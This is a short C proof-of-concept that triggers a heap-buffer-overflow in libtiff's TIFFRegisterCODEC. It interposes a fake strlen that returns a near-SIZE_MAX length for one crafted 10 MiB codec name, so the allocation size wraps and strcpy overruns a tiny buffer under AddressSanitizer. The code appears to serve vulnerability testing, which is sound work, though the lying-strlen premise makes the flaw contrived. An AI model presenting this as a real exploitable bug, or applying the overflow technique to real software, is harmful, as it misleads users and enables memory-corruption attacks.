#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <tiffio.h>

/*
  We interpose strlen so that the call inside TIFFRegisterCODEC computes an
  allocation size that overflows size_t and wraps to a very small positive
  value. Then the strcpy() in TIFFRegisterCODEC will copy the real, very long
  name into that tiny buffer, causing a heap-buffer-overflow caught by ASan.
*/

static const char *evil_name = NULL;  /* pointer to our crafted codec name */

/* Ensure the symbol has default visibility for ELF interposition. */
__attribute__((visibility("default")))
size_t strlen(const char *s)
{
    /* For our targeted pointer, lie about the length to induce overflow. */
    if (s == evil_name) {
        /* Return a value close to SIZE_MAX so that
           sizeof(codec_t)+sizeof(TIFFCodec)+strlen(name)+1 wraps around.
           Using SIZE_MAX - 8 makes the final size ~ (overhead - 7). */
        return (SIZE_MAX - 8);
    }
    /* Fallback: a simple, correct strlen for all other strings. */
    const char *p = s;
    while (*p) ++p;
    return (size_t)(p - s);
}

/* Dummy init method matching TIFFInitMethod signature */
static int dummy_init(TIFF *tif, int scheme)
{
    (void)tif;
    (void)scheme;
    return 1;
}

int main(void)
{
    /* Craft a very long codec name (actual length used by strcpy). */
    size_t real_len = 10 * 1024 * 1024; /* 10 MiB */
    char *name = (char *)malloc(real_len + 1);
    if (!name) {
        fprintf(stderr, "malloc failed\n");
        return 1;
    }
    memset(name, 'A', real_len);
    name[real_len] = '\0';

    /* Set the global pointer used by our interposed strlen. */
    evil_name = name;

    /* Invoke the vulnerable API: this will call our strlen(evil_name),
       compute a tiny allocation size due to overflow, then strcpy the real
       10 MiB string into that tiny buffer, triggering ASan. */
    uint16_t scheme = 65000; /* arbitrary user-defined scheme */

    TIFFCodec *c = TIFFRegisterCODEC(scheme, evil_name, dummy_init);

    /* If we somehow didn't crash, clean up a bit. */
    if (c) {
        /* Normally we'd unregister, but overflow should have occurred already. */
        /* TIFFUnRegisterCODEC(c); */
    }

    /* Prevent compiler from optimizing away usage. */
    fprintf(stderr, "TIFFRegisterCODEC returned %p (unexpected if no ASan crash)\n", (void*)c);

    free(name);
    return 0;
}
